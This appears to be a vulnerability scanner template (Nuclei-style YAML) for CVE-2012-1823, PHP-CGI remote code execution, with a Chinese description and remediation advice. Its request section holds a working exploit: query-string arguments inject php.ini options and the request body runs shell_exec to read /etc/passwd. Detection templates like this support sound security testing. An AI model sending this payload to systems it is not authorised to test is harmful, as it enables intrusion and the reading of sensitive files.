id: CVE-2012-1823
info:
  name: PHP CGI v5.3.12/5.4.2 Remote Code Execution
  author:
  - pikpikcu
  description: |-
    php-fpm远程代码执行漏洞
    PHP（PHP：Hypertext Preprocessor，PHP：超文本预处理器）是PHP Group和开放源代码社区共同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。

    PHP中存在信息泄漏漏洞。远程攻击者可利用该漏洞在服务器进程上下文中查看文件的源代码，获取敏感信息，在受影响计算机上运行任意PHP代码，也可能执行其他攻击。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    http://www.php.net/archive/2012.php#id2012-05-08-1
    2、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数。
requests:
- matchers:
  - type: regex
    condition: and
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    <?php echo shell_exec("cat /etc/passwd"); ?>
